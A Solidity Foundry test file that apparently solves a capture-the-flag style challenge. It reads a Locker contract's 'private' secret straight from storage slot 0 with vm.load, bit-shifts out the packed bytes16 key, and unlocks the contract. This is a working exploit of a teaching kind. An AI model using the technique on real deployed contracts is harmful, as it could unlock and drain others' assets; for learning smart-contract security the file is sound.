// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "~/private_lock/Locker.sol";

contract LockerTest is Test {
  Locker public targetLocker;

  function setUp() public {
    bytes16 secretPhrase = bytes16(keccak256(abi.encodePacked(tx.origin, "SECRET_HASH")));
    targetLocker = new Locker(secretPhrase);
  }

  function breakSecret(Locker _targetLocker) internal view returns (bytes16) {
    address lockerAddress = address(_targetLocker);
    bytes32 secretDataBlock = vm.load(lockerAddress, bytes32(uint256(0)));
    // DATA LAYOUT IN STORAGE (DUE TO VARIABLE PACKING IN SOLIDITY):
    // 15 "0" | 16 (secretKey) | 1 ("locked" status) [SLOT 0]
    bytes16 secretKey = bytes16(secretDataBlock << (15 * 8)); // Thus, left shift by 15 bytes, cast to a byte 16 to get the secret.
    return secretKey;
  }

  function testUnlockLocker() public {
    bytes16 secretKey = breakSecret(targetLocker);
    targetLocker.unlock(secretKey);

    bool isUnlocked = !targetLocker.locked();
    assertTrue(isUnlocked, "Hacker should break the lock");
  }
}
